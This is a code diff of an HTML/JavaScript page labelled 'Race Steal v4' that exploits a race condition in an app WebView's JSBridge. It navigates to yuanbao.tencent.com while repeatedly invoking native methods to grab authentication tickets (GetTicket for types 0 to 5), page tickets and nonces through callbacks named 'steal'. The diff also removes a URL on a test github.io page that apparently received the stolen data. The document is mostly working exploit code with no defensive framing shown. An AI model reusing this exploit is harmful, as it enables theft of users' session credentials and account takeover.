@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>Race Steal v3</title></head>
+<head><meta charset="utf-8"><title>Race Steal v4</title></head>
 <body>
-<h2>JSBridge Race - GetTicket Steal</h2>
+<h2>JSBridge Race - All Tickets</h2>
 <pre id="log" style="font-size:10px;max-height:90vh;overflow:auto;"></pre>
 <script>
 var log = document.getElementById('log');
@@ -17,39 +17,44 @@ function callJSBridge(module, method, param, cbName) {
     window.JSCallJavaMgr.JSCallNative(JSON.stringify(req));
 }
 
-var RECV_URL = "https://zhuos6678-test.github.io/huiyitest112233.github.io/recv.html";
-
 function doRace() {
     if (!window.JSCallJavaMgr) { addLog('ERROR: JSCallJavaMgr not found!'); return; }
-    addLog('=== Race Steal v3 ===');
+    addLog('=== Race Steal v4: All Tickets ===');
     addLog('URL: ' + location.href);
 
     location.href = "https://yuanbao.tencent.com/";
 
-    // 策略：每个延迟只发 1 个 GetTicket，提高命中率
-    // LoadUrl 和 GetTicket 交替发，覆盖更多窗口
     var delays = [0, 20, 40, 60, 80, 100, 130, 160, 200, 250, 300, 400, 500];
     for (var d = 0; d < delays.length; d++) {
         (function(delay) {
             setTimeout(function() {
                 try {
-                    callJSBridge('CommonPlugin', 'GetTicket', {ticket_type: 0}, 'steal_cb_w9');
+                    // 所有 ticket_type: 0=W9, 1=W10, 2=W14, 也试 3,4,5
+                    callJSBridge('CommonPlugin', 'GetTicket', {ticket_type: 0}, 'steal_w9');
+                    callJSBridge('CommonPlugin', 'GetTicket', {ticket_type: 1}, 'steal_w10');
+                    callJSBridge('CommonPlugin', 'GetTicket', {ticket_type: 2}, 'steal_w14');
+                    callJSBridge('CommonPlugin', 'GetTicket', {ticket_type: 3}, 'steal_t3');
+                    callJSBridge('CommonPlugin', 'GetTicket', {ticket_type: 4}, 'steal_t4');
+                    callJSBridge('CommonPlugin', 'GetTicket', {ticket_type: 5}, 'steal_t5');
+                    callJSBridge('CommonPlugin', 'GetCurrentPageTicket', {}, 'steal_page');
+                    callJSBridge('CommonPlugin', 'GetNonceStr', {}, 'steal_nonce');
                 } catch(e) {}
             }, delay);
         })(delays[d]);
     }
 
-    // setInterval: 只发 GetTicket，高频
+    // setInterval 轮流发不同 type
     var ivCount = 0;
     var iv = setInterval(function() {
         ivCount++;
+        var t = ivCount % 6;
         try {
-            callJSBridge('CommonPlugin', 'GetTicket', {ticket_type: 0}, 'steal_cb_w9');
+            callJSBridge('CommonPlugin', 'GetTicket', {ticket_type: t}, 'steal_t' + t);
         } catch(e) { clearInterval(iv); }
-        if (ivCount > 200) clearInterval(iv);
+        if (ivCount > 300) clearInterval(iv);
     }, 0);
 
-    addLog('Race started');
+    addLog('Race started - all ticket types');
 }
 
 setTimeout(function() {
